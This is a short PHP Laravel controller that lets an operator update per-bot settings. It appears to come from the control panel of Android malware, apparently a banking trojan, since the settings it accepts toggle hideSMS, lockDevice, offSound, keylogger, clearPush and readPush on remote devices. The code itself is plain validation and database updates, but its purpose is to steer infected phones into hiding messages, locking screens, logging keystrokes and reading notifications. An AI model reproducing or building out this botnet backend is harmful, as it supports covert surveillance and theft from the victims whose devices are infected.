<?php

namespace App\Http\Controllers;

use App\Helpers\ApiResponse;
use App\Http\Resources\Bot\BotResource;
use App\Models\Bot;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;

class BotSettingsController extends Controller
{
    /**
     * @throws ValidationException
     */
    public function update(string $botId, Request $request): ApiResponse
    {
        $routeParamsRequest = new Request($request->route()[2]);

        $this->validate($routeParamsRequest, [
            'botId' => 'exists:bots,id',
        ]);

        $this->validate($request, [
            'type' => 'required|string|in:hideSMS,lockDevice,offSound,keylogger,clearPush,readPush',
            'value' => 'required|boolean',
        ]);

        $bot = Bot::findOrFail($botId);

        $settings = $bot->settings;
        $settings[$request->get('type')] = $request->get('value') === true ? "1" : "0";
        $bot->update([
            'settings' => $settings,
            'update_settings' => true,
        ]);

        return ApiResponse::success(BotResource::make($bot));
    }
}